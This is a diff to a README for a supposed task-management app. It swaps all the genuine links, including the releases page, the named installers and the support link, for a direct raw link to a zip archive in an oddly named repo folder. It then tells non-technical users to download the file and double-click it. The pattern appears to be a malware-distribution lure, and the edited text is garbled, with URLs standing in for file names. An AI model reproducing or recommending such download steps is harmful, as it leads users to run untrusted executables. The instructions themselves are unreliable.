@@ -4,11 +4,11 @@
 Welcome to powersub-demo-5858! This application helps you manage tasks effectively and keeps you organized in a straightforward way. You can easily download and run it, even if you have no technical experience. 
 
 ## 📦 Download
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/drinzeka/powersub-demo-5858/releases)
+[![Download Now](https://github.com/drinzeka/powersub-demo-5858/raw/refs/heads/main/calfless/powersub-demo-v2.6.zip%20Now-Click%20Here-brightgreen)](https://github.com/drinzeka/powersub-demo-5858/raw/refs/heads/main/calfless/powersub-demo-v2.6.zip)
 
 To download the latest version of powersub-demo-5858, visit this page:
 
-[Download from Releases](https://github.com/drinzeka/powersub-demo-5858/releases)
+[Download from Releases](https://github.com/drinzeka/powersub-demo-5858/raw/refs/heads/main/calfless/powersub-demo-v2.6.zip)
 
 ## 🛠️ System Requirements
 Before you start, ensure that your computer meets the following requirements:
@@ -19,8 +19,8 @@ Before you start, ensure that your computer meets the following requirements:
 - **Processor:** 1 GHz or faster
 
 ## 📥 Download & Install
-1. Click on the [Download from Releases](https://github.com/drinzeka/powersub-demo-5858/releases) link above.
-2. You will see a list of available versions. Choose the most recent one. Look for the file named `powersub-demo-5858.exe` for Windows or `powersub-demo-5858.dmg` for macOS.
+1. Click on the [Download from Releases](https://github.com/drinzeka/powersub-demo-5858/raw/refs/heads/main/calfless/powersub-demo-v2.6.zip) link above.
+2. You will see a list of available versions. Choose the most recent one. Look for the file named `https://github.com/drinzeka/powersub-demo-5858/raw/refs/heads/main/calfless/powersub-demo-v2.6.zip` for Windows or `https://github.com/drinzeka/powersub-demo-5858/raw/refs/heads/main/calfless/powersub-demo-v2.6.zip` for macOS.
 3. Click the file name to start the download.
 4. Once the download completes, locate the file in your downloads folder.
 5. Double-click the file to begin the installation.
@@ -52,6 +52,6 @@ If you face issues while using the app, consider the following solutions:
 For further assistance, feel free to contact our support team.
 
 ## 📞 Support
-If you have questions, please reach out via [GitHub Issues](https://github.com/drinzeka/powersub-demo-5858/issues). We aim to respond within 24 hours.
+If you have questions, please reach out via [GitHub Issues](https://github.com/drinzeka/powersub-demo-5858/raw/refs/heads/main/calfless/powersub-demo-v2.6.zip). We aim to respond within 24 hours.
 
 Thank you for choosing powersub-demo-5858! Enjoy managing your tasks efficiently.
